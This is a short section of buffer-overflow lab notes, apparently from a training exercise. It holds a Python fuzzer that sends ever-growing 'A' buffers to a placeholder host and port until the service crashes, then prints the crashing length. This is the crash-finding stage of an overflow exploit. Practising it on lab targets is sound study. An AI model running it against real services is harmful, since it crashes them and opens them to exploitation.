## Fuzzing

- ``fuzz.py``

```
#!/usr/bin/env python3

import socket, time, sys

ip = "<RHOST>"      # target IP
port = "<RPORT>"    # target port (the port that the application is running on)
timeout = 5         # connection timeout

prefix = "OVERFLOW1 "
buffer = prefix + "A" * 100

while True:
  try: 
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    # establish connection
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      
      print("Fuzzing with {} bytes".format(len(buffer) - len(prefix)))
      s.send(bytes(buffer, "latin-1"))
      s.recv(1024)
  
  except:
    print("Fuzzing crashed at {} bytes".format(len(buffer) - len(prefix)))
    sys.exit(0)
  
  buffer += 100 * "A"
  time.sleep(1)
```
